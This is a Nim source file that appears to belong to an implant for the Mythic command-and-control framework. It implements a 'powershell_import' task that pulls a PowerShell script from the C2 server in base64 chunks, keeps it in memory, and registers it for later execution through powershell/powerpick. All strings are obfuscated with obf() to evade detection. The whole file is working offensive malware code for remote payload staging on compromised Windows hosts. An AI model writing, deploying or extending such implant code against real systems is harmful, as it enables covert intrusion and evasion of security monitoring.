import json, base64, strutils
import ../utils/strenc

when defined(windows):
  import ../global_data

const CHUNK_SIZE = 512000  # 512KB chunks

type
  PowershellImportArgs = object
    file: string
    file_name: string

proc executePowershellImport*(taskId: string, params: JsonNode): JsonNode =
  ## Initiate a PowerShell script import from Mythic
  ## This is a background task that requests chunks from Mythic
  
  when not defined(windows):
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("powershell_import is only supported on Windows")
    }
  else:
    try:
      let args = to(params, PowershellImportArgs)
      
      # Request first chunk of the file
      return %*{
        obf("upload"): {
          obf("chunk_size"): CHUNK_SIZE,
          obf("file_id"): args.file,
          obf("chunk_num"): 1,
          obf("full_path"): obf("memory:") & args.file_name
        },
        obf("task_id"): taskId,
        obf("user_output"): obf("Downloading PowerShell script '") & args.file_name & obf("' chunk 1\n")
      }
      
    except Exception as e:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Error initiating powershell_import: ") & e.msg
      }

proc processPowershellImportChunk*(taskId: string, fileId: string, fileName: string, chunkNum: int, chunkData: string, totalChunks: int, fileData: var seq[byte]): JsonNode =
  ## Process a chunk received from Mythic for PowerShell import
  ## Accumulates chunks in memory and stores the script when complete
  
  when not defined(windows):
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("powershell_import is only supported on Windows")
    }
  else:
    try:
      # Decode the chunk and append to accumulated file data
      let decodedData = base64.decode(chunkData)
      for c in decodedData:
        fileData.add(byte(c))
      
      # If more chunks remain, request the next one
      if chunkNum < totalChunks:
        let nextChunk = chunkNum + 1
        return %*{
          obf("upload"): {
            obf("chunk_size"): CHUNK_SIZE,
            obf("file_id"): fileId,
            obf("chunk_num"): nextChunk,
            obf("full_path"): obf("memory:") & fileName
          },
          obf("task_id"): taskId,
          obf("user_output"): obf("Downloading PowerShell script chunk ") & $nextChunk & "/" & $totalChunks & "\n"
        }
      else:
        # All chunks received - convert bytes to string
        var scriptContent = newString(fileData.len)
        for i in 0..<fileData.len:
          scriptContent[i] = char(fileData[i])
        
        # Extract just the filename without path for the name
        var scriptName = fileName
        if scriptName.contains("\\"):
          scriptName = scriptName.split("\\")[^1]
        if scriptName.contains("/"):
          scriptName = scriptName.split("/")[^1]
        # Remove "memory:" prefix if present
        if scriptName.startsWith("memory:"):
          scriptName = scriptName[7..^1]
        
        addImportedPsScript(scriptName, scriptContent)
        
        let importedNames = getImportedPsScriptNames()
        var output = obf("[+] Successfully imported PowerShell script '") & scriptName & obf("' (") & $scriptContent.len & obf(" bytes)\n")
        output.add(obf("[*] Currently imported scripts:\n"))
        for name in importedNames:
          output.add(obf("    - ") & name & "\n")
        output.add(obf("[*] Functions from imported scripts are available via 'scripts' parameter in powershell/powerpick.\n"))
        output.add(obf("[*] Use powershell_list to see all imported scripts."))
        
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): obf("success"),
          obf("user_output"): output
        }
      
    except Exception as e:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Error processing powershell_import chunk ") & $chunkNum & ": " & e.msg
      }
